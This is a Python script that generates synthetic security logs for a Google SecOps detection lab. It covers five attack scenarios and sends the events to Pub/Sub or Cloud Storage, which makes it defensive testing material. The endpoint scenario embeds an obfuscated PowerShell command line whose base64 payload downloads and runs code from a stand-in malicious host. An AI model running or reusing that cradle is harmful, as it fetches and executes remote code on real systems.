#!/usr/bin/env python3
"""
Google Cloud SecOps Lab - Enterprise SOC Telemetry & Attack Simulation Generator
Author: Joabson Saccomani (@jsaccomani)
Date: 2026-08-17

Simulates raw security logs matching the 5 YARA-L detection scenarios:
1. Microsoft Entra ID Brute Force (5 failures + 1 success within 10m)
2. GCP Cloud Audit Privilege Escalation (SetIamPolicy with Owner/Admin role)
3. Network Outbound Threat Intel / C2 IOC Match (VPC Flow / Firewall)
4. Endpoint Suspicious Process / Encoded PowerShell (CrowdStrike EDR)
5. Impossible Travel Anomaly (Logins from BR and SG within 22m)

Supports direct publishing to Google Cloud Pub/Sub, upload to Cloud Storage, or --dry-run mode.
"""

import argparse
import datetime
import json
import os
import sys
import time
import uuid

# Default GCP Environment configuration
DEFAULT_PROJECT_ID = "prj-secops-enterprise-lab"
DEFAULT_TOPIC_NAME = "top-secops-ent-ingestion-generic-secops-lab"
DEFAULT_BUCKET_NAME = "bkt-secops-ent-ingestion-prj-secops-enterprise-lab"


def get_iso_timestamp(offset_seconds=0):
    """Returns ISO 8601 UTC timestamp with optional offset."""
    dt = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(seconds=offset_seconds)
    return dt.strftime("%Y-%m-%dT%H:%M:%S.%fZ")


def generate_entra_bruteforce_logs():
    """Scenario 1: Entra ID Brute Force (5 Failures + 1 Success in 10m)."""
    user_upn = "carlos.mendes@company.internal"
    attacker_ip = "198.51.100.44"
    tenant_id = "generic_secops-tenant-id-prod"
    events = []

    # 5 Failed Attempts (Error 50126: Invalid username or password)
    for i in range(5):
        timestamp = get_iso_timestamp(offset_seconds=-(400 - (i * 60)))
        events.append({
            "log_type": "AZURE_AD",
            "timestamp": timestamp,
            "operationName": "Sign-in activity",
            "identity": user_upn,
            "userPrincipalName": user_upn,
            "userId": "usr-8842-guid-entra",
            "ipAddress": attacker_ip,
            "appDisplayName": "Azure Portal",
            "location": {
                "city": "Bucharest",
                "countryOrRegion": "RO"
            },
            "status": {
                "errorCode": 50126,
                "failureReason": "Invalid username or password or Invalid on-premise username or password."
            },
            "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "correlationId": str(uuid.uuid4())
        })

    # 1 Successful Attempt
    events.append({
        "log_type": "AZURE_AD",
        "timestamp": get_iso_timestamp(offset_seconds=-30),
        "operationName": "Sign-in activity",
        "identity": user_upn,
        "userPrincipalName": user_upn,
        "userId": "usr-8842-guid-entra",
        "ipAddress": attacker_ip,
        "appDisplayName": "Azure Portal",
        "location": {
            "city": "Bucharest",
            "countryOrRegion": "RO"
        },
        "status": {
            "errorCode": 0,
            "failureReason": None
        },
        "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "correlationId": str(uuid.uuid4())
    })

    return "Scenario 1: Entra ID Brute Force (5 Fails + 1 Success)", events


def generate_gcp_privilege_escalation_logs():
    """Scenario 2: GCP IAM Privilege Escalation."""
    timestamp = get_iso_timestamp(offset_seconds=-120)
    event = {
        "log_type": "GCP_CLOUDAUDIT",
        "timestamp": timestamp,
        "protoPayload": {
            "serviceName": "cloudresourcemanager.googleapis.com",
            "methodName": "google.iam.v1.IAM.SetIamPolicy",
            "resourceName": f"projects/{DEFAULT_PROJECT_ID}",
            "authenticationInfo": {
                "principalEmail": "external-contractor@company.internal"
            },
            "callerIp": "203.0.113.88",
            "callerSuppliedUserAgent": "google-cloud-sdk gcloud/460.0.0",
            "serviceData": {
                "policyDelta": {
                    "bindingDeltas": [
                        {
                            "action": "ADD",
                            "role": "roles/owner",
                            "member": "user:external-contractor@company.internal"
                        }
                    ]
                }
            },
            "status": {
                "code": 0,
                "message": "OK"
            }
        },
        "insertId": str(uuid.uuid4()),
        "resource": {
            "type": "project",
            "labels": {
                "project_id": DEFAULT_PROJECT_ID
            }
        }
    }
    return "Scenario 2: GCP IAM Privilege Escalation (SetIamPolicy Owner)", [event]


def generate_network_ioc_logs():
    """Scenario 3: Outbound Network Connection to Malicious C2 IP."""
    timestamp = get_iso_timestamp(offset_seconds=-60)
    event = {
        "log_type": "GCP_VPC_FLOW",
        "timestamp": timestamp,
        "jsonPayload": {
            "src_ip": "10.128.15.22",
            "src_port": 54122,
            "dest_ip": "185.220.101.5",
            "dest_port": 443,
            "protocol": "TCP",
            "bytes_sent": 145020,
            "packets_sent": 180,
            "reporter": "SRC",
            "vpc_network": "vpc-generic_secops-corp",
            "subnetwork_name": "subnet-generic_secops-internal-us-central1"
        },
        "resource": {
            "type": "gce_subnetwork",
            "labels": {
                "project_id": DEFAULT_PROJECT_ID,
                "subnetwork_name": "subnet-generic_secops-internal-us-central1"
            }
        },
        "insertId": str(uuid.uuid4())
    }
    return "Scenario 3: Outbound Network Connection to C2 IOC (185.220.101.5)", [event]


def generate_endpoint_proc_logs():
    """Scenario 4: Endpoint Suspicious Process / Encoded PowerShell."""
    timestamp = get_iso_timestamp(offset_seconds=-90)
    event = {
        "log_type": "CROWDSTRIKE_EDR",
        "timestamp": timestamp,
        "event": {
            "EventName": "ProcessRollup2",
            "ComputerName": "WKS-FINANCE-042",
            "UserName": "rodrigo.alves@company.internal",
            "FileName": "powershell.exe",
            "CommandLine": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAuAHgAegAvAHAAOwAnACkA",
            "ParentProcess": "word.exe",
            "SHA256HashData": "4b227777d4dd1fc61c6f884f48641d02b4d121d3fd328cb08b5531fcacdabf8a",
            "LocalAddressIP4": "10.128.20.42",
            "RemoteAddressIP4": "198.51.100.99",
            "RemotePort": 8080
        },
        "sensorId": "aid-883492-bb441-generic_secops"
    }
    return "Scenario 4: EDR Suspicious Encoded PowerShell Process Launch", [event]


def generate_impossible_travel_logs():
    """Scenario 5: Impossible Travel Anomaly (Logins in BR and SG in 22 min)."""
    user_upn = "ana.pereira@company.internal"
    events = [
        # Login 1: Sao Paulo, Brazil
        {
            "log_type": "AZURE_AD",
            "timestamp": get_iso_timestamp(offset_seconds=-1320),  # 22 mins ago
            "operationName": "Sign-in activity",
            "identity": user_upn,
            "userPrincipalName": user_upn,
            "userId": "usr-9912-guid-entra",
            "ipAddress": "189.40.72.10",
            "appDisplayName": "Office 365 Exchange Online",
            "location": {
                "city": "Sao Paulo",
                "countryOrRegion": "BR"
            },
            "status": {
                "errorCode": 0,
                "failureReason": None
            },
            "correlationId": str(uuid.uuid4())
        },
        # Login 2: Singapore
        {
            "log_type": "AZURE_AD",
            "timestamp": get_iso_timestamp(offset_seconds=-60),  # 1 min ago
            "operationName": "Sign-in activity",
            "identity": user_upn,
            "userPrincipalName": user_upn,
            "userId": "usr-9912-guid-entra",
            "ipAddress": "103.152.220.15",
            "appDisplayName": "Office 365 Exchange Online",
            "location": {
                "city": "Singapore",
                "countryOrRegion": "SG"
            },
            "status": {
                "errorCode": 0,
                "failureReason": None
            },
            "correlationId": str(uuid.uuid4())
        }
    ]
    return "Scenario 5: Impossible Travel Anomaly (BR -> SG in 22 min)", events


def get_publisher_client(project_id):
    """Returns a cached PublisherClient with proper quota_project_id."""
    from google.cloud import pubsub_v1
    from google.api_core.client_options import ClientOptions
    client_options = ClientOptions(quota_project_id=project_id)
    return pubsub_v1.PublisherClient(client_options=client_options)


def publish_to_pubsub(publisher, project_id, topic_name, events):
    """Publishes JSON events to Google Cloud Pub/Sub using a shared client."""
    try:
        topic_path = publisher.topic_path(project_id, topic_name)
        futures = []

        for event in events:
            data = json.dumps(event).encode("utf-8")
            future = publisher.publish(topic_path, data, log_type=event.get("log_type", "UNKNOWN"))
            futures.append(future)

        for future in futures:
            future.result(timeout=15)

        print(f"  [+] Successfully published {len(events)} events to Pub/Sub: {topic_path}")
    except Exception as exc:
        print(f"  [-] Error publishing to Pub/Sub: {exc}", file=sys.stderr)


def upload_to_gcs(bucket_name, scenario_name, events, project_id=DEFAULT_PROJECT_ID):
    """Uploads JSON events file to Google Cloud Storage."""
    try:
        from google.cloud import storage
        from google.api_core.client_options import ClientOptions
        client_options = ClientOptions(quota_project_id=project_id)
        client = storage.Client(project=project_id, client_options=client_options)
        bucket = client.bucket(bucket_name)
        timestamp_str = datetime.datetime.now(datetime.timezone.utc).strftime("%Y%m%d_%H%M%S")
        blob_path = f"simulation/{scenario_name.replace(' ', '_').lower()}_{timestamp_str}.json"
        blob = bucket.blob(blob_path)
        blob.upload_from_string(json.dumps(events, indent=2), content_type="application/json")
        print(f"  [+] Successfully uploaded {len(events)} events to GCS: gs://{bucket_name}/{blob_path}")
    except Exception as exc:
        print(f"  [-] Error uploading to GCS: {exc}", file=sys.stderr)


def main():
    parser = argparse.ArgumentParser(
        description="Google SecOps Telemetry & Attack Simulation Log Generator"
    )
    parser.add_argument(
        "--scenario",
        choices=["all", "entra_bruteforce", "gcp_privilege_escalation", "network_ioc", "endpoint_proc", "impossible_travel"],
        default="all",
        help="Attack scenario to generate (default: all)"
    )
    parser.add_argument(
        "--target",
        choices=["pubsub", "gcs", "stdout"],
        default="pubsub",
        help="Destination target for generated events (default: pubsub)"
    )
    parser.add_argument("--project-id", "--project", dest="project_id", default=DEFAULT_PROJECT_ID, help="GCP Project ID")
    parser.add_argument("--topic", default=DEFAULT_TOPIC_NAME, help="Pub/Sub Topic name")
    parser.add_argument("--bucket", default=DEFAULT_BUCKET_NAME, help="Cloud Storage Bucket name")
    parser.add_argument("--count", type=int, default=1, help="Multiplier factor / event iterations (default: 1)")
    parser.add_argument("--dry-run", action="store_true", help="Simulate without making network calls to GCP")

    args = parser.parse_args()

    scenarios = []
    if args.scenario in ["all", "entra_bruteforce"]:
        scenarios.append(generate_entra_bruteforce_logs())
    if args.scenario in ["all", "gcp_privilege_escalation"]:
        scenarios.append(generate_gcp_privilege_escalation_logs())
    if args.scenario in ["all", "network_ioc"]:
        scenarios.append(generate_network_ioc_logs())
    if args.scenario in ["all", "endpoint_proc"]:
        scenarios.append(generate_endpoint_proc_logs())
    if args.scenario in ["all", "impossible_travel"]:
        scenarios.append(generate_impossible_travel_logs())

    print("=" * 75)
    print("🚀 Google Cloud SecOps Lab - Enterprise SOC Attack & Telemetry Simulation")
    print(f"📅 Timestamp: {datetime.datetime.now(datetime.timezone.utc).isoformat()}")
    print(f"🎯 Target Mode: {args.target.upper()} {'(DRY RUN)' if args.dry_run else ''}")
    print(f"📦 Project: {args.project_id} | Topic: {args.topic} | Bucket: {args.bucket}")
    print("=" * 75)

    total_events = 0
    publisher = None
    if not args.dry_run and args.target == "pubsub":
        publisher = get_publisher_client(args.project_id)

    for iteration in range(1, args.count + 1):
        if args.count > 1:
            print(f"\n--- Batch Iteration {iteration}/{args.count} ---")
        for title, events in scenarios:
            count = len(events)
            total_events += count
            print(f"\n[▶] {title} ({count} event{'s' if count > 1 else ''}):")

            if args.dry_run or args.target == "stdout":
                for idx, ev in enumerate(events, 1):
                    sample_str = json.dumps(ev, indent=2)
                    preview = sample_str[:220] + "..." if len(sample_str) > 220 else sample_str
                    print(f"    - Event #{idx} [{ev.get('log_type')}]: {preview.replace(chr(10), chr(10) + '      ')}")

            if not args.dry_run:
                if args.target == "pubsub" and publisher:
                    publish_to_pubsub(publisher, args.project_id, args.topic, events)
                elif args.target == "gcs":
                    upload_to_gcs(args.bucket, title, events, args.project_id)

    print("\n" + "=" * 75)
    print(f"✅ Simulation Generation Complete: {total_events} total events generated across {len(scenarios) * args.count} batches.")
    print("=" * 75)


if __name__ == "__main__":
    main()

# Audit checkpoint [2026-03-10]: feat(udm-mapping): add UDM parser mapping for custom firewall syslog format

# Audit checkpoint [2026-04-01]: feat(udm-mapping): add UDM parser mapping for custom firewall syslog format
